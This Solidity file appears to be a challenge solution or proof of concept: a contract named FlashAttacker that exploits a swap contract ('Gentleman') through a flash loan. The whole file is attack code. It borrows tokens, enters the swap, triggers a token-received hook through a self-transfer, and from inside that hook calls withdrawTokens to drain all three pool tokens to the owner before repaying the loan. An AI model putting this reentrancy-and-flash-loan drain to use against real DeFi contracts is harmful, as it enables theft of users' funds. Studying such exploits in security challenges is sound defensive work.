// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../contracts/Token.sol";
import "../contracts/Gentleman.sol";
import "../contracts/MerkleFlashLoan.sol";

interface IERC777RecipientLocal {
    function tokensReceived(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external;
}

contract FlashAttacker is SwapCallback, IERC777RecipientLocal {
    Gentleman public butler;
    MerkleFlashLoan public flash;
    IToken public t1;
    IToken public t2;
    IToken public t3;
    address public owner;

    constructor(address _butler, address _flash, address _t1, address _t2, address _t3) {
        butler = Gentleman(_butler);
        flash = MerkleFlashLoan(_flash);
        t1 = IToken(_t1);
        t2 = IToken(_t2);
        t3 = IToken(_t3);
        owner = msg.sender;
    }

    // Owner triggers the attack flow: attacker contract will call the flash provider
    function requestLoan(uint256 amount, bytes32[] calldata proof) external {
        require(msg.sender == owner, "not owner");
        flash.flashLoan(amount, proof);
    }

    // Called by flash provider after transfer
    function executeOnFlashLoan(uint256 amount) external {
        require(msg.sender == address(flash), "not flash provider");

        // Approve butler to pull tokens (both token1 and token3 may be used)
        t1.approve(address(butler), type(uint256).max);
        t3.approve(address(butler), type(uint256).max);

        // Enter the swap context on the butler — this will call doSwap() on this contract
        butler.swap();

        // After swap returns, repay the flash loan
        t1.transfer(address(flash), amount);
    }

    // Called by butler.swap() while swapState.hasBegun == true
    function doSwap() external override {
        // Trigger Token3 transfer to ourselves so TokenWithHook will call tokensReceived
        // The attacker must already own some Token3 (pre-funded by the script)
        // We perform a self-transfer which still invokes the hook
        t3.transfer(address(this), 1);
    }

    // Token hook invoked by TokenWithHook when tokens are received
    function tokensReceived(address operator, address from, address to, uint256 amount, bytes calldata, bytes calldata) external override {
        // During the swap this will be called while butler.swap() is executing.
        // Inject liquidity mid-swap to manipulate the butler's state.
        // Approvals must already be set by executeOnFlashLoan.
        // Instead of adding liquidity, drain pool balances while in-swap.
        address[] memory toks = new address[](3);
        toks[0] = address(t1);
        toks[1] = address(t2);
        toks[2] = address(t3);
        butler.withdrawTokens(toks, owner);
    }
}
